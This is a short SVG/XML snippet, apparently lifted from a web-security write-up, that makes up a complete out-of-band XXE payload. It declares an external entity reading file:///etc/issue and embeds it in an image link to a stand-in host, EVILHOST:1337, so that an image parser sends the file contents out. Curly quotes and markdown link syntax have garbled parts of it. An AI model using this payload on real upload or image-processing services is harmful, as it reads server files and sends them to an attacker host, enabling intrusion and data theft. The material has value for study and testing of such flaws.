```xml
<?xml version=”1.0" encoding=”UTF-8" standalone=”no”?>  
<!DOCTYPE ENTY \[ <!ENTITY **XXE** SYSTEM “file:///etc/issue”> \]>  
<svg xmlns:svg=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" xmlns=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" xmlns:xlink=”[http://www.w3.org/1999/xlink](http://www.w3.org/1999/xlink)" width=”200" height=”200">  
<image height=”30" width=”30" xlink:href=”[http://EVILHOST:1337/SSRF?**&XXE**](http://evilhost:1337/SVG_SSRF?&XXE);" />  
</svg>
```